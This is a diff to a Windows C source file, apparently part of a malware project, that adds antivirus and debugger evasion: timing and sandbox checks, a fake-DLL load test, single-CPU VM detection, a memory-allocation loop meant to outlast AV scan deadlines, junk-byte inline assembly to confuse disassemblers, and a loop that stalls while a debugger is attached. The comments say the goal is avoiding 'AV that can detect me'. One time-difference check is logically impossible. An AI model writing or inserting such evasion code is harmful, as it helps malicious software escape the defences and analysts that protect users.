@@ -1,3 +1,9 @@
+/*
+Function to detect AV and debugger
+Some ideas are from https://www.exploit-db.com/docs/40900.pdf
+*/
+
+
 #include "includes.h"
 #include "define.h"
 #include "extern.h"
@@ -213,19 +219,57 @@ int check_time_warp(void)
 	if (ntp_time == 0)
 	{
 		DEBUGMSG("EXIT_CODE_ERROR_NTPD");
-		ExitCode += EXIT_CODE_ERROR_NTPD;
+		// do nothing with NTP, because we are probably behind a firewall
 	}
-	// Calculate the diff
-	diff_time = UTC_time - ntp_time;
-	// Check the diff, if it's too different, we are in a time warp
-	if ((diff_time <= -UTC_TIME_DIFF) && (diff_time >= UTC_TIME_DIFF))
-	{
-		DEBUGMSG("EXIT_CODE_TIME_WARP_NTPD");
-		ExitCode += EXIT_CODE_TIME_WARP_NTPD;
+	else {
+		// Calculate the diff
+		diff_time = UTC_time - ntp_time;
+		// Check the diff, if it's too different, we are in a time warp
+		if ((diff_time <= -UTC_TIME_DIFF) && (diff_time >= UTC_TIME_DIFF))
+		{
+			DEBUGMSG("EXIT_CODE_TIME_WARP_NTPD");
+			ExitCode += EXIT_CODE_TIME_WARP_NTPD;
+		}
+		DEBUGMSGF("Difftime = %I64d\n", diff_time);
 	}
-	DEBUGMSGF("Difftime = %I64d\n", diff_time);
+
+	// Try to find if 1000 milliseconds is really 1000 milliseconds
+	DWORD Tick = GetTickCount();
+	Sleep(1000);
+
+	__asm {
+		PUSH EAX;
+		XOR EAX, EAX;
+		JZ J;
+		MOV EAX, DWORD PTR ES : [0x04];
+		__asm __emit(0x3F);
+	J:	POP EAX;
+	}
+
+	DWORD Tac = GetTickCount();
+	if ((Tac - Tick) < 1000) {
+		DEBUGMSG("EXIT_CODE_TICK_COUNT_TOO_QUICK");
+		DEBUGMSGF("Difftime = %I64d\n", (Tac - Tick));
+		ExitCode += EXIT_CODE_TICK_COUNT_TOO_QUICK;
+	}
 	return ExitCode;
 }
+
+BOOL LoadFakeLibrary(void)
+{
+	HINSTANCE DLL = LoadLibrary(TEXT("crashandler64.dll"));
+	return (DLL != NULL);
+}
+
+BOOL CheckIfOneCPU(void)
+{
+	// Check if only one CPU is available
+	SYSTEM_INFO SysGuide;
+	GetSystemInfo(&SysGuide);
+	if (SysGuide.dwNumberOfProcessors < 2) return TRUE;
+	else return FALSE;
+}
+
 
 /// <summary>
 /// This function try to detect some AV that can detect me
@@ -237,7 +281,32 @@ void noav(void)
 	// First Check : Examine the time evolution
 	ExitCode += check_time_warp();
 
-	//Second check : Examine all process name
+	// Try to load a non existant DLL
+	if (LoadFakeLibrary() == TRUE) {
+		DEBUGMSG("EXIT_CODE_FAKE_LIBRARY_LOADED");
+		ExitCode += EXIT_CODE_FAKE_LIBRARY_LOADED;
+	}
+
+	// Check if only one CPU is present, so it's a VM
+	if (CheckIfOneCPU() == TRUE)
+	{
+		DEBUGMSG("EXIT_CODE_ONLY_ONE_CPU");
+		ExitCode += EXIT_CODE_ONLY_ONE_CPU;
+	}
+
+	/* 	This method also exploits the time deadline on each AV scan, we simply allocate
+	nearly 42 Mb of memory then we will fill it with some bytes, at the end we will
+	free it.*/
+	for (int i = 0; i < ANSWER_TO_THE_ULTIMATE_QUESTION_OF_LIFE_THE_UNIVERSE_AND_EVERYTHING; i+=6) {
+		// Allocate a zone of 42Mb of memory, fill it with zero and free it
+		char *MemoryToBeZeroized = NULL;
+		MemoryToBeZeroized = (char *)malloc(ANSWER_TO_THE_ULTIMATE_QUESTION_OF_LIFE_THE_UNIVERSE_AND_EVERYTHING * MegaByte); // two time of Answer to the Ultimate Question of Life, the Universe, and Everything
+		if (MemoryToBeZeroized != NULL) {
+			memset(MemoryToBeZeroized, ANSWER_TO_THE_ULTIMATE_QUESTION_OF_LIFE_THE_UNIVERSE_AND_EVERYTHING, ANSWER_TO_THE_ULTIMATE_QUESTION_OF_LIFE_THE_UNIVERSE_AND_EVERYTHING * MegaByte);
+			free(MemoryToBeZeroized);
+		}
+	}
+	// Examine all process name
 	//TODO
 
 	if (ExitCode != 0)
@@ -247,6 +316,31 @@ void noav(void)
 	}
 }
 
+BOOL WINAPI LoopUntilNotDebugged(void)
+{
+	__asm {
+	CheckDebugger:
+		PUSH EAX;						// Save EAX
+		MOV EAX, DWORD PTR FS : [0x18];	// Get PEB structure address
+		__asm {							// Some garbage ...
+			PUSH EAX;
+			XOR EAX, EAX;
+			JZ J;
+			MOV EAX, DWORD PTR FS : [0x04];
+			__asm __emit(0xEA);
+		J:	POP EAX;
+		}
+		MOV EAX, DWORD PTR[EAX + 0x30];	// Get BeingDebuged Byte
+		CMP BYTE PTR[EAX + 2], 0;		// Check if BeingDebuged byte is set
+		JNE CheckDebugger;				// Loop until not debugged :-)
+		POP EAX;						// restore EAX
+	}
+}
+
 void noreverse(void)
 {
+	__asm {
+		PUSH EAX;
+		POP EAX;
+	}
 }
